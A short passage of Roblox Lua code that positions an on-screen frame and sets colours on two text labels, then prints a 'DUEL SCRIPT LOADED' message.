				frame.Position = UDim2.new(0.5, 0, 0.92, 0)
				frame.AnchorPoint = Vector2.new(0.5, 1)
			end
		else
			frame.Visible = true
			frame.AnchorPoint = Vector2.new(0.5, 1)
			frame.Position = UDim2.new(0.5, 0, 0.92, 0)
		end

		n20 = (n20 + 0.01) % 1
		local color2 = fn3 and fn3() or Color3.fromRGB(0, 255, 120)
		local color3 = Color3.new(color2.R * 0.85 + 0.15, color2.G * 0.85 + 0.15, color2.B * 0.85 + 0.15)
		textLabel.TextColor3 = color2
		textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
		textLabel2.TextColor3 = color3
		textLabel2.TextStrokeColor3 = Color3.new(0, 0, 0)
	end)
end)

print("DUEL SCRIPT LOADED")